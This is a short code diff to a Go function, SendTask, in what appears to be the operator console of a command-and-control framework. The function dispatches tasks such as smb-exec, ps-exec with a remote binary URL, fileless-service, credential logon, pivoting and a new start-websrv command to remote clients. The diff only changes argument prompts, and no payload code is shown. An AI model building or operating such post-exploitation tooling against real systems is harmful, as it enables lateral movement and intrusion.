@@ -728,7 +728,7 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "logon-user-netonly":
 		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password>: ")
 	case "logon-user":
-		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password> <pathToBinary>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password>: ")
 	case "whoami":
 		PrepareTaskSimple(c, clientId, command)
 	case "rev2self":
@@ -816,7 +816,7 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "smb-exec":
 		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <password><command>: ")
 	case "list-shares":
-		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <passwordOrNthash> <command>: ")
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>: ")
 	case "ps-exec":
 		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain\\username> <password> <Url of binary> <command>: ")
 	case "fileless-service":
@@ -912,6 +912,10 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "stop-ws-pivot":
 		PrepareTaskSimple(c, clientId, command)
 	case "stop-http-pivot":
+		PrepareTaskSimple(c, clientId, command)
+	case "start-websrv":
+		PrepareTaskWithArgs(c, clientId, command, "<WebRoot> <Port>: ")
+	case "stop-websrv":
 		PrepareTaskSimple(c, clientId, command)
 	default:
 		c.Println("Task not found.")
